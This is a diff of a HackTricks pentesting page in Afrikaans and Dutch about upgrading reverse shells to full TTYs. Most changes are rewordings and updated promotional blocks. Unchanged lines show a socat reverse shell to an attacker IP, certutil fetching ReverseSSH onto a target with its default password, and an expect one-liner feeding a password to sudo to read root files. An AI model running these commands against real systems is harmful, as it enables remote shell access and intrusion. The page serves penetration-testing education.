@@ -1,22 +1,23 @@
 # Volledige TTYs
 
+{% hint style="success" %}
+Leer en oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
+* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegramgroep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
+{% endhint %}
 
 ## Volledige TTY
 
-Let daarop dat die skulp wat jy in die `SHELL`-veranderlike stel, **moet** wees **opgesom binne** _**/etc/shells**_ of `Die waarde vir die SHELL-veranderlike is nie gevind in die /etc/shells-lêer nie. Hierdie voorval is aangemeld`. Let ook daarop dat die volgende snippe slegs werk in bash. As jy in 'n zsh is, verander na 'n bash voordat jy die skulp bekom deur `bash` uit te voer.
+Merk op dat die skaal wat jy instel in die `SHELL` veranderlike **moet** wees **gelys binne** _**/etc/shells**_ of `Die waarde vir die SHELL-veranderlike is nie gevind in die /etc/shells-lêer nie. Hierdie voorval is gerapporteer`. Merk ook op dat die volgende snippers slegs werk in bash. As jy in 'n zsh is, skakel oor na 'n bash voordat jy die skaal bekom deur `bash` te hardloop.
 
 #### Python
 
@@ -29,12 +30,10 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-Jy kan die **aantal** van **rye** en **kolomme** kry deur **`stty -a`** uit te voer
+Jy kan die **aantal** van **rye** en **kolomme** kry deur **`stty -a`** uit te voer.
 {% endhint %}
 
-#### skrip
-
-{% code overflow="wrap" %}
+#### skrips
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
@@ -66,11 +65,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-'n Gerieflike manier vir **interaktiewe skulptoegang**, sowel as **lêeroordragte** en **poort deurstuur**, is om die staties gekoppelde ssh-bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
+'n Gerieflike manier vir **interaktiewe skel-toegang**, sowel as **lêeroordragte** en **poort deurstuur**, is om die staties gekoppelde ssh-bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gekomprimeerde binaêre lêers. Vir ander binaêre lêers, kyk na die [vrylatingsbladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hieronder is 'n voorbeeld vir `x86` met upx-saamgedrukte binêre lêers. Vir ander binêre lêers, kyk na [vrystellingsbladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Maak lokaal gereed om die ssh-poortdeurstuurversoek te ontvang:
+1. Berei plaaslik voor om die ssh-poort deurstuur versoek te vang:
 
 {% code overflow="wrap" %}
 ```bash
@@ -101,9 +100,7 @@ certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/d
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-{% endcode %}
-
-* As die ReverseSSH-poort deurstuurversoek suksesvol was, moet jy nou in staat wees om in te teken met die verstek wagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` uitvoer:
+* Indien die ReverseSSH-poort deurstuurversoek suksesvol was, behoort jy nou in te kan teken met die verstek wagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` hardloop:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -113,20 +110,21 @@ sftp -P 8888 127.0.0.1
 ```
 ## Geen TTY
 
-As jy om een of ander rede nie 'n volledige TTY kan verkry nie, kan jy steeds met programme interaksie hê wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` oorgedra om 'n lêer te lees:
+Indien jy om enige rede nie 'n volledige TTY kan verkry nie, kan jy steeds met programme interaksie hê wat gebruikersinsette verwag. In die volgende voorbeeld word die wagwoord aan `sudo` deurgegee om 'n lêer te lees:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+{% hint style="success" %}
+Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
